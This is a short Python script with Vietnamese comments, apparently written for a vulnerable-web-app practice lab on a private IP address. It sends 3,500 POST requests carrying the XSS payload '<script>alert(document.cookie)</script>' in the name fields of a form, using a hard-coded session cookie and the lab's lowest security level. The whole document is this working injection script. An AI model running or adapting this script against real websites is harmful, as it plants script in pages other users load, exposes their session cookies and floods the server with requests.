import requests
import time

# URL gốc
url = "http://192.168.10.10/xss_post.php"

# Payload tấn công XSS
payload = "<script>alert(document.cookie)</script>"

# Số lượng request cần thực hiện
num_requests = 3500

# Cookie cần gửi
cookies = {
    'security_level': '0',
    'PHPSESSID': '0k6gg6biqflmnbb39ttveugod1'
}

# Hàm thực hiện request
def send_xss_requests():
    for i in range(num_requests):
        # Dữ liệu POST gửi lên
        data = {
            'firstname': payload,
            'lastname': payload,
            'form': 'submit'
        }

        # Gửi request POST kèm theo cookies
        response = requests.post(url, data=data, cookies=cookies)
        
        # Kiểm tra kết quả trả về
        if response.status_code == 200:
            print(f"Request {i+1}: Thành công!")
        else:
            print(f"Request {i+1}: Thất bại")
        
        # Chờ 0.5 giây trước khi thực hiện request tiếp theo
        time.sleep(0.5)

# Thực hiện request
send_xss_requests()
